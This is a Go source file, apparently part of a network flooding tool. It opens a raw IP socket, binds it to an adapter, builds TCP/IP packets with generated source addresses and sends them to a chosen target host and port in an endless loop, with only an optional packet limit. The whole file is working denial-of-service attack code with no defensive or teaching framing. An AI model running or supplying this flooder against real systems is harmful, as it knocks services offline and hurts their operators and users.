package main

import (
	"fmt"
	"reflect"
	"sync"
	"syscall"
)

func (tcp TCPIP) rawSocket(descriptor int, sockaddr syscall.SockaddrInet4) {
	err := syscall.Sendto(descriptor, tcp.Payload, 0, &sockaddr)
	if err != nil {
		fmt.Println(err)
	} else {
		packetCount++

		if debugMode {
			fmt.Printf(
				"Socket used:  %d.%d.%d.%d:%d\n",
				tcp.SRC[0], tcp.SRC[1], tcp.SRC[2], tcp.SRC[3], tcp.SrcPort,
			)
		}
	}
}

func (tcp *TCPIP) floodTarget(wg *sync.WaitGroup, rType reflect.Type, rVal reflect.Value) {
	defer wg.Done()

	var dest [4]byte
	copy(dest[:], tcp.DST[:4])
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	err := syscall.BindToDevice(fd, tcp.Adapter)
	if err != nil {
		panic(fmt.Errorf("bind to adapter %s failed: %v", tcp.Adapter, err))
	}

	addr := syscall.SockaddrInet4{
		Port: int(tcp.DstPort),
		Addr: dest,
	}

	tcp.genIP()
	tcp.calcTCPChecksum()
	tcp.buildPayload(rType, rVal)

	for {
		if packetLimit > 0 && packetCount > packetLimit {
			break
		}

		tcp.rawSocket(fd, addr)
	}
}

func (tcp *TCPIP) buildPayload(t reflect.Type, v reflect.Value) {
	tcp.Payload = make([]byte, 60)

	var payloadIndex int = 0
	for i := 0; i < t.NumField(); i++ {
		field := t.Field(i)
		alias, _ := field.Tag.Lookup("key")
		if len(alias) < 1 {
			key := v.Field(i).Interface()
			keyType := reflect.TypeOf(key).Kind()
			switch keyType {
			case reflect.Uint8:
				tcp.Payload[payloadIndex] = key.(uint8)
				payloadIndex++
			case reflect.Uint16:
				tcp.Payload[payloadIndex] = (uint8)(key.(uint16) >> 8)
				payloadIndex++
				tcp.Payload[payloadIndex] = (uint8)(key.(uint16) & 0x00FF)
				payloadIndex++
			default:
				for _, element := range key.([]uint8) {
					tcp.Payload[payloadIndex] = element
					payloadIndex++
				}
			}
		}
	}
}
